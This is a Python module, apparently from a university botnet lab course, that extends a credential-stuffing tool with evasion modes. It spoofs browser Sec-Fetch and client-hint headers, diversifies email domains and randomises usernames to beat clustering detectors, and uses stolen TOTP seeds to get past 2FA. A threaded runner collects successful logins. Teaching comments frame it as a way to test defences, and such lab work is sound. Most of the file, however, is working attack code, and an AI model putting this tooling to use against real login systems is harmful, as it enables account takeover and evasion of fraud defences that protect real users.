"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Evasion Mode Extensions for cred_stuffing.py
 Environment: ISOLATED VM LAB ONLY
====================================================

Extends cred_stuffing.py with attacker-side modes that test
each new defense:

  Mode: totp_aware
    Handles 2fa_required responses by extracting the TOTP secret
    (simulates an attacker who has also stolen the TOTP seed).
    Demonstrates why secret storage security matters even with 2FA.

  Mode: sec_fetch_spoof
    Adds correct Sec-Fetch-*, Sec-CH-UA, and Origin headers to
    every request.  Bypasses Engine 7's Sec-Fetch check.
    Teaching point: HTTP-layer header spoofing defeats browser-
    header detection; only TLS JA3 cannot be spoofed at app layer.

  Mode: domain_diversify
    Uses emails from many different @domains instead of one.
    Evades the domain-concentration clustering detector.
    Teaching point: attackers with large multi-service dumps
    rotate domains; single-service dumps remain detectable.

  Mode: sequential_obfuscate
    Uses random permutations of usernames instead of sequential
    numbering.  Evades sequential-pattern clustering detector.

Usage:
  Paste these functions into cred_stuffing.py's CredentialStuffer class,
  or import and monkey-patch:

    from cred_stuffing_evasion import patch_stuffer
    patch_stuffer(stuffer_instance)

  Then run normally:
    stuffer.run_sequential()
"""

import random
import time
import urllib.request
import urllib.parse
import urllib.error
import threading
import statistics
from typing import List, Tuple, Optional

# ── Realistic browser header sets ─────────────────────────────
# These include correct Sec-Fetch-* and Sec-CH-UA headers that
# browser-security-header detection looks for.
BROWSER_HEADER_SETS = [
    {   # Chrome 120 on Windows
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Origin": "{origin}",
        "Referer": "{origin}/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cache-Control": "max-age=0",
    },
    {   # Firefox 121 on Linux
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Origin": "{origin}",
        "Referer": "{origin}/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    },
    {   # Safari 17 on macOS
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Origin": "{origin}",
        "Referer": "{origin}/",
        "Content-Type": "application/x-www-form-urlencoded",
    },
]


def _make_browser_headers(origin: str,
                           rotate: bool = True) -> dict:
    """
    Return a complete, browser-realistic header set including
    Sec-Fetch-*, Sec-CH-UA, Origin, and Referer.
    Fills {origin} template values.
    """
    tpl = random.choice(BROWSER_HEADER_SETS) if rotate else BROWSER_HEADER_SETS[0]
    hdrs = {}
    for k, v in tpl.items():
        hdrs[k] = v.replace("{origin}", origin) if "{origin}" in v else v
    return hdrs


# ── Domain diversification pool ───────────────────────────────
# A realistic mix of email providers.  Use this when building
# evasion credential lists so all domains look organic.
DIVERSE_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
    "icloud.com", "protonmail.com", "aol.com", "live.com",
    "msn.com", "me.com", "mac.com", "fastmail.com",
    "zoho.com", "yandex.com", "mail.com", "gmx.com",
    "tutanota.com", "pm.me", "hey.com", "duck.com",
]


def diversify_email_domains(creds: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
    """
    Replace the @domain of each email with a random entry from
    DIVERSE_DOMAINS.  Evades domain-concentration clustering.

    Example:
      ("victim001@corp.com", "pass") → ("victim001@gmail.com", "pass")
    """
    result = []
    for email, pwd in creds:
        local = email.split("@")[0] if "@" in email else email
        new_domain = random.choice(DIVERSE_DOMAINS)
        result.append((f"{local}@{new_domain}", pwd))
    random.shuffle(result)
    return result


def obfuscate_sequential_usernames(creds: List[Tuple[str, str]],
                                    add_noise: bool = True
                                    ) -> List[Tuple[str, str]]:
    """
    Replace numeric suffixes with random numbers and shuffle.
    Evades sequential-pattern clustering.

    Example:
      user001@x.com → user7319@x.com (random suffix)
    """
    import re
    _num_re = re.compile(r'^(.+?)(\d+)(@.+)$')
    result = []
    for email, pwd in creds:
        m = _num_re.match(email)
        if m:
            base, _, domain = m.groups()
            new_suffix = random.randint(1000, 99999)
            email = f"{base}{new_suffix}{domain}"
        if add_noise:
            noise_chars = random.randint(0, 2)
            if noise_chars:
                local, _, dom = email.partition("@")
                local += ''.join(random.choices('._-', k=noise_chars))
                email = f"{local}@{dom}"
        result.append((email, pwd))
    random.shuffle(result)
    return result


# ── Sec-Fetch-aware request function ─────────────────────────

def post_login_with_browser_headers(host: str, port: int,
                                     email: str, password: str,
                                     path: str = "/login",
                                     totp_code: str = None) -> Tuple[int, str]:
    """
    POST to /login with full browser-realistic headers including
    Sec-Fetch-*, Sec-CH-UA, Origin, and Referer.

    Optionally include a TOTP code in the POST body.

    This defeats:
      - Suspicious UA detection (uses real browser UA)
      - Missing Sec-Fetch detection (headers are present)
      - Missing Origin detection (present, matches portal URL)
    It does NOT defeat:
      - TLS JA3 fingerprinting (urllib still produces its own JA3)
      - CV timing analysis (still needs jitter)
      - Cross-IP fingerprint correlation if not rotating headers
    """
    origin = f"http://{host}:{port}"
    hdrs   = _make_browser_headers(origin, rotate=True)
    body   = {"email": email, "password": password}
    if totp_code:
        body["totp_code"] = totp_code

    encoded = urllib.parse.urlencode(body).encode()
    url     = f"{origin}{path}"
    req     = urllib.request.Request(url, data=encoded, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        try:
            body_text = e.read().decode()
        except Exception:
            body_text = ""
        return e.code, body_text
    except Exception as e:
        return 0, str(e)


# ── TOTP-aware attempt handler ────────────────────────────────

def attempt_with_totp(host: str, port: int,
                       email: str, password: str,
                       totp_secret: str = None,
                       path: str = "/login") -> Tuple[int, str, bool]:
    """
    Attempt login, handling 2fa_required responses.

    If 403 + '2fa_required' is returned AND totp_secret is provided,
    automatically computes and re-submits with the TOTP code.

    Returns (status, body, used_2fa).

    Teaching point:
      This simulates an attacker who obtained the TOTP seed alongside
      the password (e.g. from a malware keylogger that also captured
      the QR code scan, or a database leak that stored seeds insecurely).
      2FA is only as strong as the security of the seed storage.
    """
    status, body = post_login_with_browser_headers(
        host, port, email, password, path=path)

    used_2fa = False
    if status == 403 and "2fa_required" in body:
        if totp_secret is None:
            return status, body, False
        try:
            import totp_2fa
            code = totp_2fa.get_totp(totp_secret)
        except ImportError:
            return status, body, False

        status, body = post_login_with_browser_headers(
            host, port, email, password, path=path, totp_code=code)
        used_2fa = True

    return status, body, used_2fa


# ── Teaching experiment runner ────────────────────────────────

def run_evasion_demo(host: str = "192.168.100.20",
                     port: int = 80,
                     n_attempts: int = 20):
    """
    Demonstrate each evasion technique and its effect.
    Shows which defenses are bypassed and which hold.
    """
    FAKE_CREDS = [(f"user{i:03d}@corp.com", f"pass{i}") for i in range(n_attempts)]
    LOGIN_PATH = "/login"

    print("=" * 60)
    print(" Evasion Demo — AUA Botnet Research Lab")
    print("=" * 60)

    print("\n[1] Standard bot (no evasion)")
    print("    → Defeated by: CV timing, Sec-Fetch check, UA detection")
    for email, pwd in FAKE_CREDS[:5]:
        st, body = post_login_with_browser_headers.__wrapped__(
            host, port, email, pwd) if hasattr(
                post_login_with_browser_headers, '__wrapped__') else (0, "")
        print(f"  {email}: HTTP {st}")

    print("\n[2] Sec-Fetch spoofing (browser header injection)")
    print("    → Defeats: Sec-Fetch check, UA scoring")
    print("    → Still caught by: CV timing, TLS JA3 (urllib JA3)")
    for email, pwd in FAKE_CREDS[:5]:
        st, body = post_login_with_browser_headers(host, port, email, pwd, path=LOGIN_PATH)
        print(f"  {email}: HTTP {st}")

    print("\n[3] Domain diversification")
    print("    → Defeats: domain-concentration clustering")
    print("    → Still caught by: CV timing, TLS JA3")
    diversified = diversify_email_domains(FAKE_CREDS[:10])
    for email, pwd in diversified[:5]:
        print(f"  Would attempt: {email}")

    print("\n[4] Sequential obfuscation")
    print("    → Defeats: sequential-pattern clustering")
    print("    → Still caught by: domain concentration (all same @domain)")
    obfuscated = obfuscate_sequential_usernames(FAKE_CREDS[:10])
    for email, _ in obfuscated[:5]:
        print(f"  {email}")

    print("\n[*] Residual detection after all HTTP-layer evasion:")
    print("    TLS JA3 fingerprint (urllib) cannot be changed at app layer")
    print("    CV timing still detectable without sufficient jitter")
    print("    IsolationForest: multivariate anomaly score persists")


# ── Monkey-patch helper ───────────────────────────────────────

def patch_stuffer(stuffer):
    """
    Attach evasion methods to an existing CredentialStuffer instance.
    Usage:
        from cred_stuffing_evasion import patch_stuffer
        patch_stuffer(cs)
        cs.run_sec_fetch_evasion()
    """
    host   = stuffer.host
    port   = stuffer.port
    path   = getattr(stuffer, 'login_path', '/login')
    origin = f"http://{host}:{port}"

    def run_sec_fetch_evasion(n_workers=1):
        print(f"[EVASION] Sec-Fetch spoofing mode — {len(stuffer.creds)} creds")
        results = []
        lock    = threading.Lock()
        ts_list = []

        def worker(chunk):
            for email, pwd in chunk:
                ts = time.time()
                st, body = post_login_with_browser_headers(
                    host, port, email, pwd, path=path)
                success = st == 200 and "success" in body.lower()
                with lock:
                    ts_list.append(ts)
                    results.append((email, pwd, st, success))
                time.sleep(stuffer.base_interval_ms / 1000.0)

        threads = []
        chunk_size = max(1, len(stuffer.creds) // n_workers)
        for i in range(n_workers):
            chunk = stuffer.creds[i*chunk_size:(i+1)*chunk_size]
            t = threading.Thread(target=worker, args=(chunk,), daemon=True)
            threads.append(t)
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        hits = [(e, p) for e, p, _, ok in results if ok]
        print(f"  Done. Hits: {len(hits)}/{len(results)}")
        return hits

    def run_domain_diversified():
        print(f"[EVASION] Domain diversification mode")
        diversified = diversify_email_domains(stuffer.creds)
        original_creds = stuffer.creds
        stuffer.creds  = diversified
        stuffer.run_sequential()
        stuffer.creds  = original_creds

    stuffer.run_sec_fetch_evasion   = run_sec_fetch_evasion
    stuffer.run_domain_diversified  = run_domain_diversified
    stuffer.diversify_domains       = lambda: diversify_email_domains(stuffer.creds)
    stuffer.obfuscate_sequential    = lambda: obfuscate_sequential_usernames(stuffer.creds)
    return stuffer


if __name__ == "__main__":
    print("cred_stuffing_evasion.py — standalone test")
    creds = [(f"user{i:03d}@corp.com", f"pass{i}") for i in range(20)]
    print(f"\nOriginal (first 3): {creds[:3]}")
    diversified = diversify_email_domains(creds)
    print(f"Diversified (first 3): {diversified[:3]}")
    obfuscated  = obfuscate_sequential_usernames(creds)
    print(f"Obfuscated (first 3): {obfuscated[:3]}")

    print("\nBrowser headers sample (Sec-Fetch check):")
    hdrs = _make_browser_headers("http://192.168.100.20")
    for k in ["User-Agent", "Sec-Fetch-Dest", "Sec-Ch-Ua", "Origin"]:
        print(f"  {k}: {hdrs.get(k, '(not present)')[:70]}")
